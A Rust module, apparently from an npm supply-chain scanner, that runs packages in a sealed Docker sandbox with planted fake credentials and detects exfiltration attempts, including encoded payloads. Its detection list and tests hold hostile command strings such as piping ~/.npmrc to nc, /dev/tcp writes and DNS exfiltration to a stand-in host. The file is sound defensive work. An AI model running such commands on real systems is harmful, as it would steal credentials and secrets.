//! Deep (dynamic) scan: install and run the package in a throwaway Docker
//! container with no network, planted fake credentials (honeytokens) and an
//! instrumented Node runtime, then report every outbound attempt, credential
//! read, and whether any planted secret appeared in what it tried to send.
//!
//! How it works:
//! 1. Host side, nothing from the package executes: `npm install <tarball>
//!    --ignore-scripts` materialises the package and its dependencies.
//! 2. Two container runs, "dev" and "ci" (CI-looking env, since a lot of
//!    malware only fires in CI where the valuable tokens are). Each run gets
//!    fresh canary values. Inside: `npm rebuild` (install scripts), then
//!    `require()` (import), then the bin with `--help` (runtime). See
//!    `sandbox/entry.sh`.
//! 3. `sandbox/hook.cjs` is preloaded into every node process and logs
//!    network attempts (with payloads), subprocesses and credential reads;
//!    network tools on PATH are shims that log argv + stdin.
//! 4. The host decodes payloads (url / base64 / base64url / hex / base32 /
//!    gzip / zlib / raw deflate, nested) and looks for the canaries.
//!
//! Limits: the hook is in-process, so native code or a package that restores
//! the originals can hide its attempts from the log. `--network none` still
//! guarantees nothing actually leaves. Kernel-level observation (eBPF, or
//! gVisor via `--runtime=runsc`) is the upgrade path; see `sandbox/README.md`.

use serde::{Deserialize, Serialize};
use std::collections::BTreeSet;
use std::io::Read;
use std::path::{Path, PathBuf};
use std::process::Stdio;
use std::sync::atomic::{AtomicU64, Ordering};
use std::sync::{Mutex, OnceLock};
use std::time::{Duration, Instant, SystemTime, UNIX_EPOCH};

pub struct SandboxInput {
    pub name: String,
    pub version: String,
    pub tarball: PathBuf,
    pub registry: String,
}

#[derive(Serialize, Deserialize, Clone, Debug, PartialEq)]
pub struct SandboxReport {
    /// "ok" | "skipped" | "error" | "timeout"
    pub status: String,
    pub reason: Option<String>,
    pub runs: Vec<String>,
    pub attempts: Vec<Attempt>,
    pub file_reads: Vec<FileRead>,
    pub duration_ms: u64,
}

#[derive(Serialize, Deserialize, Clone, Debug, PartialEq)]
pub struct Attempt {
    /// "dns" | "tcp" | "http" | "udp" | "exec"
    pub kind: String,
    pub target: String,
    pub phase: String,
    pub run: String,
    pub payload_preview: Option<String>,
    pub canary_hits: Vec<String>,
}

#[derive(Serialize, Deserialize, Clone, Debug, PartialEq)]
pub struct FileRead {
    pub path: String,
    pub phase: String,
    pub run: String,
}

// --- tunables ------------------------------------------------------------------

const RUN_TIMEOUT: Duration = Duration::from_secs(60);
const INSTALL_TIMEOUT: Duration = Duration::from_secs(120);
const BUILD_TIMEOUT: Duration = Duration::from_secs(300);
const MAX_INSTALL_BYTES: u64 = 512 * 1024 * 1024;
const MAX_EVENTS: usize = 5_000;
const PREVIEW_CHARS: usize = 160;

// The sandbox image is built from these files, embedded so the binary is
// self-contained. The tag is a hash of their contents.
const IMG_FILES: &[(&str, &str)] = &[
    ("Dockerfile", include_str!("../sandbox/Dockerfile")),
    ("hook.cjs", include_str!("../sandbox/hook.cjs")),
    ("shim-log.cjs", include_str!("../sandbox/shim-log.cjs")),
    ("entry.sh", include_str!("../sandbox/entry.sh")),
    ("shims/_shim.sh", include_str!("../sandbox/shims/_shim.sh")),
];

// --- availability ----------------------------------------------------------------

/// Docker CLI present and daemon reachable. Cached: a yes for 10 minutes, a no
/// for 15 seconds (so a daemon that's still starting is picked up soon).
pub fn available() -> bool {
    static CACHE: Mutex<Option<(bool, Instant)>> = Mutex::new(None);
    let mut c = CACHE.lock().unwrap_or_else(|e| e.into_inner());
    if let Some((ok, at)) = *c {
        let ttl = if ok { Duration::from_secs(600) } else { Duration::from_secs(15) };
        if at.elapsed() < ttl {
            return ok;
        }
    }
    let ok = docker_ping();
    *c = Some((ok, Instant::now()));
    ok
}

fn docker_ping() -> bool {
    let child = std::process::Command::new("docker")
        .args(["info", "--format", "{{.ServerVersion}}"])
        .stdout(Stdio::null())
        .stderr(Stdio::null())
        .spawn();
    let Ok(mut child) = child else { return false };
    let deadline = Instant::now() + Duration::from_secs(5);
    loop {
        match child.try_wait() {
            Ok(Some(s)) => return s.success(),
            Ok(None) if Instant::now() < deadline => std::thread::sleep(Duration::from_millis(50)),
            _ => {
                let _ = child.kill();
                return false;
            }
        }
    }
}

// --- entry point -------------------------------------------------------------------

/// Never panics; every failure becomes a report with status "error" or "skipped".
pub async fn run(input: &SandboxInput) -> SandboxReport {
    let start = Instant::now();
    let mut report = SandboxReport {
        status: "ok".into(),
        reason: None,
        runs: vec![],
        attempts: vec![],
        file_reads: vec![],
        duration_ms: 0,
    };
    if !available() {
        report.status = "skipped".into();
        report.reason = Some("docker is not available on the scan host".into());
        report.duration_ms = ms(start);
        return report;
    }
    // Bound concurrent sandboxes on one host.
    static SEM: OnceLock<tokio::sync::Semaphore> = OnceLock::new();
    let sem = SEM.get_or_init(|| {
        let n = std::env::var("NPRYX_SCAN_SANDBOX_CONCURRENCY").ok().and_then(|v| v.parse().ok()).unwrap_or(2);
        tokio::sync::Semaphore::new(n)
    });
    let _permit = sem.acquire().await;

    let result = run_inner(input, &mut report).await;
    if let Err(e) = result {
        report.status = "error".into();
        report.reason = Some(e);
    }
    report.duration_ms = ms(start);
    report
}

async fn run_inner(input: &SandboxInput, report: &mut SandboxReport) -> Result<(), String> {
    let image = ensure_image().await?;
    let root = TempDir::new()?;
    let install = root.path().join("install");
    std::fs::create_dir_all(&install).map_err(|e| format!("mkdir: {e}"))?;
    std::fs::write(install.join("package.json"), r#"{"name":"npryx-sandbox-root","private":true}"#)
        .map_err(|e| format!("write package.json: {e}"))?;

    // 1. Materialise package + deps with scripts OFF: no package code runs here.
    let tarball = input.tarball.canonicalize().map_err(|e| format!("tarball: {e}"))?;
    let mut npm = tokio::process::Command::new("npm");
    npm.current_dir(&install)
        .args(["install", &tarball.to_string_lossy(), "--ignore-scripts", "--no-audit", "--no-fund", "--no-save", "--loglevel=error"])
        .arg(format!("--registry={}", input.registry))
        .env("npm_config_update_notifier", "false")
        .stdin(Stdio::null())
        .stdout(Stdio::null())
        .stderr(Stdio::piped())
        .kill_on_drop(true);
    let out = tokio::time::timeout(INSTALL_TIMEOUT, npm.output())
        .await
        .map_err(|_| "npm install (scripts off) timed out".to_string())?
        .map_err(|e| format!("npm install: {e}"))?;
    if !out.status.success() {
        let err = String::from_utf8_lossy(&out.stderr);
        return Err(format!("npm install (scripts off) failed: {}", first_line(&err)));
    }
    let size = dir_size(&install);
    if size > MAX_INSTALL_BYTES {
        return Err(format!("installed tree is {} MB, over the {} MB cap", size >> 20, MAX_INSTALL_BYTES >> 20));
    }
    let bin = bin_name(&install, &input.name);

    // 2. Two runs with fresh canaries each.
    let mut timed_out = false;
    for run in ["dev", "ci"] {
        let dir = root.path().join(run);
        copy_dir(&install, &dir.join("work"))?;
        let canaries = Canaries::generate();
        plant_home(&dir.join("home"), &canaries)?;
        std::fs::create_dir_all(dir.join("log")).map_err(|e| format!("mkdir log: {e}"))?;
        // The container user (uid 10001) must be able to write the bind mounts.
        chmod_world(&dir);

        let name = format!("npryx-sbx-{}-{}", std::process::id(), unique());
        let mut cmd = tokio::process::Command::new("docker");
        cmd.args(["run", "--rm", "--name", &name, "--network", "none", "--memory", "512m", "--cpus", "1"])
            .args(["--pids-limit", "256", "--read-only", "--tmpfs", "/tmp:rw,exec,size=256m"])
            .args(["--security-opt", "no-new-privileges", "--cap-drop", "ALL", "--user", "10001:10001"])
            .arg("-v").arg(format!("{}:/work:rw", dir.join("work").display()))
            .arg("-v").arg(format!("{}:/home/sandbox:rw", dir.join("home").display()))
            .arg("-v").arg(format!("{}:/npryx-log:rw", dir.join("log").display()));
        let mut envs: Vec<(String, String)> = vec![
            ("HOME".into(), "/home/sandbox".into()),
            ("NPRYX_EVENTS".into(), "/npryx-log/events.jsonl".into()),
            ("NPRYX_RUN".into(), run.into()),
            ("NPRYX_PKG".into(), input.name.clone()),
            ("NPRYX_BIN".into(), bin.clone().unwrap_or_default()),
            ("npm_config_cache".into(), "/tmp/.npm".into()),
            ("npm_config_offline".into(), "true".into()),
            ("npm_config_update_notifier".into(), "false".into()),
            ("NPM_TOKEN".into(), canaries.npm.clone()),
            ("GITHUB_TOKEN".into(), canaries.github.clone()),
            ("AWS_ACCESS_KEY_ID".into(), canaries.aws_id.clone()),
            ("AWS_SECRET_ACCESS_KEY".into(), canaries.aws_secret.clone()),
        ];
        if run == "ci" {
            for (k, v) in [
                ("CI", "true"),
                ("GITHUB_ACTIONS", "true"),
                ("GITHUB_REPOSITORY", "acme/web"),
                ("GITHUB_WORKFLOW", "release"),
                ("GITHUB_REF", "refs/heads/main"),
                ("RUNNER_OS", "Linux"),
            ] {
                envs.push((k.into(), v.into()));
            }
        }
        for (k, v) in &envs {
            cmd.arg("-e").arg(format!("{k}={v}"));
        }
        cmd.arg(&image).stdin(Stdio::null()).stdout(Stdio::null()).stderr(Stdio::null()).kill_on_drop(true);

        let status = match cmd.spawn() {
            Err(e) => return Err(format!("docker run: {e}")),
            Ok(mut child) => match tokio::time::timeout(RUN_TIMEOUT, child.wait()).await {
                Ok(_) => "ok",
                Err(_) => {
                    let _ = tokio::process::Command::new("docker").args(["kill", &name]).output().await;
                    let _ = child.wait().await;
                    "timeout"
                }
            },
        };
        if status == "timeout" {
            timed_out = true;
        }
        report.runs.push(run.into());
        let events = std::fs::read_to_string(dir.join("log").join("events.jsonl")).unwrap_or_default();
        collect(&events, run, &canaries, report);
    }
    dedupe(report);
    if timed_out {
        report.status = "timeout".into();
        report.reason = Some(format!("a run exceeded {}s; results are partial", RUN_TIMEOUT.as_secs()));
    }
    Ok(())
}

// --- image ---------------------------------------------------------------------------

async fn ensure_image() -> Result<String, String> {
    static BUILT: tokio::sync::Mutex<Option<String>> = tokio::sync::Mutex::const_new(None);
    let mut built = BUILT.lock().await;
    if let Some(tag) = built.as_ref() {
        return Ok(tag.clone());
    }
    let mut h: u64 = 0xcbf29ce484222325;
    for (name, body) in IMG_FILES {
        for b in name.bytes().chain(body.bytes()) {
            h ^= b as u64;
            h = h.wrapping_mul(0x100000001b3);
        }
    }
    let tag = format!("npryx-sandbox:{h:016x}");
    let have = tokio::process::Command::new("docker")
        .args(["image", "inspect", &tag])
        .stdout(Stdio::null())
        .stderr(Stdio::null())
        .status()
        .await
        .map(|s| s.success())
        .unwrap_or(false);
    if !have {
        let ctx = TempDir::new()?;
        for (name, body) in IMG_FILES {
            let p = ctx.path().join(name);
            if let Some(parent) = p.parent() {
                std::fs::create_dir_all(parent).map_err(|e| format!("image ctx: {e}"))?;
            }
            std::fs::write(&p, body).map_err(|e| format!("image ctx: {e}"))?;
        }
        let mut b = tokio::process::Command::new("docker");
        b.args(["build", "-q", "-t", &tag]).arg(ctx.path()).stdout(Stdio::null()).stderr(Stdio::piped()).kill_on_drop(true);
        let out = tokio::time::timeout(BUILD_TIMEOUT, b.output())
            .await
            .map_err(|_| "docker build timed out".to_string())?
            .map_err(|e| format!("docker build: {e}"))?;
        if !out.status.success() {
            return Err(format!("docker build failed: {}", first_line(&String::from_utf8_lossy(&out.stderr))));
        }
    }
    *built = Some(tag.clone());
    Ok(tag)
}

// --- canaries ----------------------------------------------------------------------

#[derive(Clone, Debug)]
pub(crate) struct Canaries {
    npm: String,
    github: String,
    aws_id: String,
    aws_secret: String,
    ssh: String,
}

impl Canaries {
    fn generate() -> Self {
        let mut rng = XorShift::seeded();
        Canaries {
            npm: format!("npm_{}", rng.alnum(36)),
            github: format!("ghp_{}", rng.alnum(36)),
            aws_id: format!("AKIA{}", rng.upper_alnum(16)),
            aws_secret: rng.alnum(40),
            ssh: rng.alnum(48),
        }
    }

    fn named(&self) -> Vec<(&'static str, &str)> {
        vec![
            ("npm-token", &self.npm),
            ("github-token", &self.github),
            ("aws-access-key", &self.aws_id),
            ("aws-secret", &self.aws_secret),
            ("ssh-key", &self.ssh),
        ]
    }
}

fn plant_home(home: &Path, c: &Canaries) -> Result<(), String> {
    let w = |rel: &str, body: String| -> Result<(), String> {
        let p = home.join(rel);
        if let Some(parent) = p.parent() {
            std::fs::create_dir_all(parent).map_err(|e| format!("honeytoken: {e}"))?;
        }
        std::fs::write(&p, body).map_err(|e| format!("honeytoken: {e}"))
    };
    w(".npmrc", format!("//registry.npmjs.org/:_authToken={}\n", c.npm))?;
    w(".aws/credentials", format!("[default]\naws_access_key_id = {}\naws_secret_access_key = {}\n", c.aws_id, c.aws_secret))?;
    // Not a real key: a key-shaped block whose body is the canary.
    w(
        ".ssh/id_ed25519",
        format!("-----BEGIN OPENSSH PRIVATE KEY-----\nb3BlbnNzaC1rZXktdjEAAAAA{}\n-----END OPENSSH PRIVATE KEY-----\n", c.ssh),
    )?;
    w(".git-credentials", format!("https://ci-bot:{}@github.com\n", c.github))?;
    Ok(())
}

struct XorShift(u64);
impl XorShift {
    fn seeded() -> Self {
        let t = SystemTime::now().duration_since(UNIX_EPOCH).map(|d| d.as_nanos() as u64).unwrap_or(0);
        let mut s = t ^ ((std::process::id() as u64) << 32) ^ unique().wrapping_mul(0x9E3779B97F4A7C15);
        if s == 0 {
            s = 0x2545F4914F6CDD1D;
        }
        let mut x = XorShift(s);
        for _ in 0..8 {
            x.next();
        }
        x
    }
    fn next(&mut self) -> u64 {
        let mut x = self.0;
        x ^= x << 13;
        x ^= x >> 7;
        x ^= x << 17;
        self.0 = x;
        x
    }
    fn pick(&mut self, n: usize, set: &[u8]) -> String {
        (0..n).map(|_| set[(self.next() % set.len() as u64) as usize] as char).collect()
    }
    fn alnum(&mut self, n: usize) -> String {
        self.pick(n, b"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789")
    }
    fn upper_alnum(&mut self, n: usize) -> String {
        self.pick(n, b"ABCDEFGHIJKLMNOPQRSTUVWXYZ234567")
    }
}

// --- event collection ------------------------------------------------------------

#[derive(Deserialize)]
struct RawEvent {
    kind: String,
    #[serde(default)]
    target: String,
    #[serde(default)]
    phase: String,
    #[serde(default)]
    via: Option<String>,
    #[serde(default)]
    payload_b64: Option<String>,
}

fn collect(events: &str, run: &str, canaries: &Canaries, report: &mut SandboxReport) {
    for line in events.lines().take(MAX_EVENTS) {
        let Ok(ev) = serde_json::from_str::<RawEvent>(line) else { continue };
        let phase = if ev.phase.is_empty() { "unknown".to_string() } else { ev.phase.clone() };
        if ev.kind == "file_read" {
            report.file_reads.push(FileRead { path: ev.target, phase, run: run.into() });
            continue;
        }
        if !["dns", "tcp", "http", "udp", "exec"].contains(&ev.kind.as_str()) {
            continue;
        }
        if ev.kind == "exec" && ev.via.is_none() && !suspicious_exec(&ev.target) {
            continue; // ordinary build tooling, not egress
        }
        let payload = ev
            .payload_b64
            .as_deref()
            .and_then(|b| b64_decode(b.as_bytes(), false))
            .unwrap_or_default();
        let mut blobs = vec![ev.target.as_bytes().to_vec()];
        if !payload.is_empty() {
            blobs.push(payload.clone());
        }
        if ev.kind == "dns" {
            // DNS exfil hides data in labels: also try the labels joined up.
            let joined: String = ev.target.split('.').collect();
            blobs.push(joined.into_bytes());
        }
        let hits = find_canaries(&blobs, &canaries.named());
        report.attempts.push(Attempt {
            kind: ev.kind,
            target: truncate(&ev.target, 512),
            phase,
            run: run.into(),
            payload_preview: if payload.is_empty() { None } else { Some(preview(&payload)) },
            canary_hits: hits,
        });
    }
}

fn suspicious_exec(cmd: &str) -> bool {
    let c = cmd.to_ascii_lowercase();
    let tools = ["curl", "wget", "nc", "ncat", "netcat", "socat", "telnet", "ssh", "scp", "sftp", "powershell", "pwsh", "nslookup", "dig", "ftp", "tftp"];
    let first_words = c.split(|ch: char| ch.is_whitespace() || ch == ';' || ch == '|' || ch == '&' || ch == '(' || ch == '`');
    let tool_hit = first_words.map(|w| w.rsplit('/').next().unwrap_or(w)).any(|w| tools.contains(&w));
    tool_hit || c.contains("/dev/tcp/") || c.contains("/dev/udp/") || c.contains("python -c") || c.contains("python3 -c") || c.contains("perl -e")
}

fn dedupe(report: &mut SandboxReport) {
    let mut seen = BTreeSet::new();
    report.attempts.retain(|a| seen.insert((a.kind.clone(), a.target.clone(), a.phase.clone(), a.run.clone(), a.canary_hits.clone())));
    let mut seen = BTreeSet::new();
    report.file_reads.retain(|f| seen.insert((f.path.clone(), f.phase.clone(), f.run.clone())));
}

// --- canary decoder (pure) ------------------------------------------------------------

/// Search blobs for canary values, plain or behind layers of encoding:
/// url-encoding, base64, base64url, hex, base32 and gzip / zlib / raw deflate,
/// nested up to a few levels. Returns the names of the canaries found.
pub(crate) fn find_canaries(blobs: &[Vec<u8>], canaries: &[(&'static str, &str)]) -> Vec<String> {
    let mut hits = BTreeSet::new();
    let mut work: Vec<(Vec<u8>, u8)> = blobs.iter().map(|b| (b.clone(), 0)).collect();
    let mut budget: usize = 8 * 1024 * 1024; // bytes examined, total
    let mut seen = BTreeSet::new();
    while let Some((buf, depth)) = work.pop() {
        if buf.len() < 8 || budget < buf.len() || !seen.insert(hash(&buf)) {
            continue;
        }
        budget -= buf.len();
        for (name, value) in canaries {
            if contains(&buf, value.as_bytes()) {
                hits.insert(name.to_string());
            }
        }
        if hits.len() == canaries.len() || depth >= 4 {
            continue;
        }
        for d in derive(&buf) {
            work.push((d, depth + 1));
        }
    }
    hits.into_iter().collect()
}

fn derive(buf: &[u8]) -> Vec<Vec<u8>> {
    let mut out = vec![];
    if let Some(d) = inflate_any(buf) {
        out.push(d);
    }
    if buf.contains(&b'%') || buf.contains(&b'+') {
        let d = url_decode(buf);
        if d != buf {
            out.push(d);
        }
    }
    let b64_runs = runs(buf, |c| c.is_ascii_alphanumeric() || matches!(c, b'+' | b'/' | b'=' | b'-' | b'_'), 12);
    // `=` is padding, but it's also how `key=value` glues text onto a blob: try the pieces too.
    let pieces = b64_runs.iter().flat_map(|r| r.split(|&c| c == b'=').filter(|p| p.len() >= 12));
    let candidates: Vec<&[u8]> = b64_runs.iter().copied().chain(pieces).take(512).collect();
    for run in candidates {
        // A run may carry a few bytes of unrelated text at its start; try every alignment.
        for skip in 0..4.min(run.len()) {
            if let Some(d) = b64_decode(&run[skip..], true) {
                if d.len() >= 6 {
                    if let Some(z) = inflate_any(&d) {
                        out.push(z);
                    }
                    out.push(d);
                }
            }
        }
    }
    for run in runs(buf, |c| c.is_ascii_hexdigit(), 16) {
        for skip in 0..2.min(run.len()) {
            if let Some(d) = hex_decode(&run[skip..]) {
                out.push(d);
            }
        }
    }
    for run in runs(buf, |c| c.is_ascii_alphanumeric() || c == b'=', 16) {
        if let Some(d) = base32_decode(run) {
            out.push(d);
        }
    }
    out
}

fn runs(buf: &[u8], ok: impl Fn(u8) -> bool, min: usize) -> Vec<&[u8]> {
    let mut v = vec![];
    let mut start = None;
    for (i, &c) in buf.iter().enumerate() {
        match (ok(c), start) {
            (true, None) => start = Some(i),
            (false, Some(s)) => {
                if i - s >= min {
                    v.push(&buf[s..i]);
                }
                start = None;
            }
            _ => {}
        }
    }
    if let Some(s) = start {
        if buf.len() - s >= min {
            v.push(&buf[s..]);
        }
    }
    v.truncate(256);
    v
}

/// Lenient base64 / base64url: ignores padding, decodes the longest whole prefix.
pub(crate) fn b64_decode(s: &[u8], lenient: bool) -> Option<Vec<u8>> {
    let mut out = Vec::with_capacity(s.len() * 3 / 4);
    let (mut acc, mut bits) = (0u32, 0u8);
    for &c in s {
        let v = match c {
            b'A'..=b'Z' => c - b'A',
            b'a'..=b'z' => c - b'a' + 26,
            b'0'..=b'9' => c - b'0' + 52,
            b'+' | b'-' => 62,
            b'/' | b'_' => 63,
            b'=' => break,
            b'\n' | b'\r' if !lenient => continue,
            _ => {
                if lenient {
                    break;
                }
                return None;
            }
        };
        acc = (acc << 6) | v as u32;
        bits += 6;
        if bits >= 8 {
            bits -= 8;
            out.push((acc >> bits) as u8);
            acc &= (1 << bits) - 1;
        }
    }
    if out.is_empty() { None } else { Some(out) }
}

fn hex_decode(s: &[u8]) -> Option<Vec<u8>> {
    let n = s.len() / 2 * 2;
    let val = |c: u8| (c as char).to_digit(16).map(|d| d as u8);
    let mut out = Vec::with_capacity(n / 2);
    for pair in s[..n].chunks(2) {
        out.push(val(pair[0])? << 4 | val(pair[1])?);
    }
    Some(out)
}

fn base32_decode(s: &[u8]) -> Option<Vec<u8>> {
    let mut out = vec![];
    let (mut acc, mut bits) = (0u64, 0u8);
    for &c in s {
        let v = match c.to_ascii_uppercase() {
            b'A'..=b'Z' => c.to_ascii_uppercase() - b'A',
            b'2'..=b'7' => c - b'2' + 26,
            b'=' => break,
            _ => return None,
        };
        acc = (acc << 5) | v as u64;
        bits += 5;
        if bits >= 8 {
            bits -= 8;
            out.push((acc >> bits) as u8);
            acc &= (1 << bits) - 1;
        }
    }
    if out.is_empty() { None } else { Some(out) }
}

fn url_decode(s: &[u8]) -> Vec<u8> {
    let mut out = Vec::with_capacity(s.len());
    let mut i = 0;
    while i < s.len() {
        match s[i] {
            b'%' if i + 2 < s.len() => match hex_decode(&s[i + 1..i + 3]) {
                Some(b) => {
                    out.extend(b);
                    i += 3;
                    continue;
                }
                None => out.push(b'%'),
            },
            b'+' => out.push(b' '),
            c => out.push(c),
        }
        i += 1;
    }
    out
}

/// gzip, zlib, or raw deflate — whichever produces output.
fn inflate_any(buf: &[u8]) -> Option<Vec<u8>> {
    use flate2::read::{DeflateDecoder, GzDecoder, ZlibDecoder};
    let cap = 4 * 1024 * 1024;
    let take = |r: &mut dyn Read| -> Option<Vec<u8>> {
        let mut out = vec![];
        r.take(cap).read_to_end(&mut out).ok()?;
        if out.is_empty() { None } else { Some(out) }
    };
    if buf.len() >= 2 && buf[0] == 0x1f && buf[1] == 0x8b {
        return take(&mut GzDecoder::new(buf));
    }
    if buf.len() >= 2 && buf[0] & 0x0f == 8 && ((buf[0] as u16) << 8 | buf[1] as u16).is_multiple_of(31) {
        if let Some(d) = take(&mut ZlibDecoder::new(buf)) {
            return Some(d);
        }
    }
    // Raw deflate has no header; only accept it if it decodes to mostly text.
    let d = take(&mut DeflateDecoder::new(buf))?;
    let printable = d.iter().filter(|&&c| c.is_ascii_graphic() || c == b' ' || c == b'\n').count();
    if d.len() >= 8 && printable * 10 >= d.len() * 9 { Some(d) } else { None }
}

fn contains(hay: &[u8], needle: &[u8]) -> bool {
    !needle.is_empty() && hay.windows(needle.len()).any(|w| w == needle)
}

fn hash(b: &[u8]) -> u64 {
    let mut h: u64 = 0xcbf29ce484222325;
    for &c in b {
        h ^= c as u64;
        h = h.wrapping_mul(0x100000001b3);
    }
    h ^ (b.len() as u64)
}

// --- small helpers ------------------------------------------------------------------

fn preview(b: &[u8]) -> String {
    let printable = b.iter().filter(|&&c| c.is_ascii_graphic() || c == b' ' || c == b'\n' || c == b'\t').count();
    let s = if printable * 10 >= b.len() * 9 {
        String::from_utf8_lossy(b).replace('\n', "\\n")
    } else {
        use base64::Engine;
        format!("b64:{}", base64::engine::general_purpose::STANDARD.encode(&b[..b.len().min(120)]))
    };
    truncate(&s, PREVIEW_CHARS)
}

fn truncate(s: &str, n: usize) -> String {
    if s.chars().count() <= n { s.to_string() } else { s.chars().take(n).collect::<String>() + "…" }
}

fn first_line(s: &str) -> String {
    truncate(s.lines().find(|l| !l.trim().is_empty()).unwrap_or("").trim(), 300)
}

fn ms(start: Instant) -> u64 {
    start.elapsed().as_millis() as u64
}

fn unique() -> u64 {
    static N: AtomicU64 = AtomicU64::new(0);
    N.fetch_add(1, Ordering::Relaxed)
}

fn bin_name(install: &Path, name: &str) -> Option<String> {
    let pj = std::fs::read_to_string(install.join("node_modules").join(name).join("package.json")).ok()?;
    let v: serde_json::Value = serde_json::from_str(&pj).ok()?;
    match v.get("bin")? {
        serde_json::Value::String(_) => Some(name.rsplit('/').next().unwrap_or(name).to_string()),
        serde_json::Value::Object(m) => m.keys().next().cloned(),
        _ => None,
    }
}

fn dir_size(p: &Path) -> u64 {
    let mut total = 0;
    let mut stack = vec![p.to_path_buf()];
    while let Some(d) = stack.pop() {
        let Ok(rd) = std::fs::read_dir(&d) else { continue };
        for e in rd.flatten() {
            let Ok(md) = e.metadata() else { continue };
            if md.is_dir() {
                stack.push(e.path());
            } else {
                total += md.len();
            }
        }
    }
    total
}

fn copy_dir(from: &Path, to: &Path) -> Result<(), String> {
    std::fs::create_dir_all(to).map_err(|e| format!("mkdir: {e}"))?;
    let out = std::process::Command::new("cp")
        .arg("-R")
        .arg(format!("{}/.", from.display()))
        .arg(to)
        .output()
        .map_err(|e| format!("cp: {e}"))?;
    if out.status.success() { Ok(()) } else { Err(format!("cp: {}", first_line(&String::from_utf8_lossy(&out.stderr)))) }
}

fn chmod_world(p: &Path) {
    let _ = std::process::Command::new("chmod").args(["-R", "a+rwX"]).arg(p).output();
}

/// Temp dir removed on drop. Files the container created may be owned by its
/// uid (Linux); entry.sh chmods them, and a docker-based cleanup is the fallback.
struct TempDir(PathBuf);
impl TempDir {
    fn new() -> Result<Self, String> {
        let p = std::env::temp_dir().join(format!("npryx-sbx-{}-{}-{}", std::process::id(), unique(), XorShift::seeded().alnum(8)));
        std::fs::create_dir_all(&p).map_err(|e| format!("tempdir: {e}"))?;
        Ok(TempDir(p))
    }
    fn path(&self) -> &Path {
        &self.0
    }
}
impl Drop for TempDir {
    fn drop(&mut self) {
        if std::fs::remove_dir_all(&self.0).is_err() {
            let _ = std::process::Command::new("docker")
                .args(["run", "--rm", "--network", "none", "-v"])
                .arg(format!("{}:/x", self.0.display()))
                .args(["busybox", "sh", "-c", "rm -rf /x/* /x/.[!.]*"])
                .output();
            let _ = std::fs::remove_dir_all(&self.0);
        }
    }
}

// --- tests -----------------------------------------------------------------------------

#[cfg(test)]
mod tests {
    use super::*;
    use base64::Engine;
    use std::io::Write;

    const C: &str = "npm_Zk3QpL9xVb2TnR8sYw4HcJ6dMf1GaE7uKi0O";

    fn names() -> Vec<(&'static str, &'static str)> {
        vec![("npm-token", C), ("aws-secret", "wJalrXUtnFEMIK7MDENGbPxRfiCYzzCANARY99")]
    }

    fn hits(blob: &[u8]) -> Vec<String> {
        find_canaries(&[blob.to_vec()], &names())
    }

    #[test]
    fn canary_plain_and_wrapped_in_json() {
        assert_eq!(hits(format!("{{\"t\":\"{C}\"}}").as_bytes()), vec!["npm-token"]);
    }

    #[test]
    fn canary_base64_at_any_alignment() {
        for prefix in ["", "x", "xy", "{\"h\":\"host\",\"t\":\""] {
            let enc = base64::engine::general_purpose::STANDARD.encode(format!("{prefix}{C}\"}}"));
            assert_eq!(hits(format!("data={enc}").as_bytes()), vec!["npm-token"], "prefix {prefix:?}");
        }
    }

    #[test]
    fn canary_base64url_hex_url_and_base32() {
        let u = base64::engine::general_purpose::URL_SAFE_NO_PAD.encode(format!("?? {C}"));
        assert_eq!(hits(format!("https://x.io/c?d={u}").as_bytes()), vec!["npm-token"]);
        let h: String = format!("tok={C}").bytes().map(|b| format!("{b:02x}")).collect();
        assert_eq!(hits(format!("{h}.exfil.example.com").as_bytes()), vec!["npm-token"]);
        let pct: String = format!("tok={C}").bytes().map(|b| format!("%{b:02X}")).collect();
        assert_eq!(hits(pct.as_bytes()), vec!["npm-token"]);
        assert_eq!(hits(b32(format!("t={C}").as_bytes()).as_bytes()), vec!["npm-token"]);
    }

    #[test]
    fn canary_gzip_and_deflate_then_base64() {
        let mut gz = flate2::write::GzEncoder::new(vec![], flate2::Compression::default());
        gz.write_all(format!("{{\"env\":{{\"NPM_TOKEN\":\"{C}\"}}}}").as_bytes()).unwrap();
        let gz = gz.finish().unwrap();
        assert_eq!(hits(&gz), vec!["npm-token"], "raw gzip body");
        let b = base64::engine::general_purpose::STANDARD.encode(&gz);
        assert_eq!(hits(b.as_bytes()), vec!["npm-token"], "base64(gzip)");
        let mut df = flate2::write::DeflateEncoder::new(vec![], flate2::Compression::default());
        df.write_all(format!("secret={C}").as_bytes()).unwrap();
        let b = base64::engine::general_purpose::STANDARD.encode(df.finish().unwrap());
        assert_eq!(hits(b.as_bytes()), vec!["npm-token"], "base64(raw deflate)");
    }

    #[test]
    fn canary_nested_layers_and_multiple() {
        let inner = base64::engine::general_purpose::STANDARD.encode(format!("{C} wJalrXUtnFEMIK7MDENGbPxRfiCYzzCANARY99"));
        let outer: String = inner.bytes().map(|b| format!("{b:02x}")).collect();
        assert_eq!(hits(outer.as_bytes()), vec!["aws-secret", "npm-token"]);
    }

    #[test]
    fn no_false_hit_on_unrelated_payloads() {
        assert!(hits(b"GET /v1/packages HTTP/1.1\nhost: registry.npmjs.org\n\n").is_empty());
        let other = base64::engine::general_purpose::STANDARD.encode("npm_notTheCanaryValueAtAll000000000000");
        assert!(hits(other.as_bytes()).is_empty());
        assert!(hits(&[0u8; 4096]).is_empty());
    }

    #[test]
    fn suspicious_exec_picks_network_tools_only() {
        assert!(suspicious_exec("curl -d @- https://x.io"));
        assert!(suspicious_exec("/bin/sh -c cat ~/.npmrc | /usr/bin/nc 1.2.3.4 80"));
        assert!(suspicious_exec("bash -c 'echo hi > /dev/tcp/1.2.3.4/80'"));
        assert!(!suspicious_exec("node-gyp rebuild"));
        assert!(!suspicious_exec("/bin/sh -c node install.js"));
        assert!(!suspicious_exec("uname -a"));
    }

    #[test]
    fn collect_parses_events_and_flags_canaries() {
        let mut c = Canaries::generate();
        c.npm = C.to_string();
        let body = base64::engine::general_purpose::STANDARD.encode(format!("{{\"t\":\"{C}\"}}"));
        let ev = format!(
            "{}\n{}\n{}\nnot json\n{}\n",
            serde_json::json!({"kind":"http","target":"https://45.77.12.9/c","phase":"install","payload_b64": base64::engine::general_purpose::STANDARD.encode(&body)}),
            serde_json::json!({"kind":"file_read","target":"~/.npmrc","phase":"install"}),
            serde_json::json!({"kind":"exec","target":"node-gyp rebuild","phase":"install"}),
            serde_json::json!({"kind":"dns","target":"6869.exfil.example.com","phase":"import"}),
        );
        let mut r = SandboxReport { status: "ok".into(), reason: None, runs: vec![], attempts: vec![], file_reads: vec![], duration_ms: 0 };
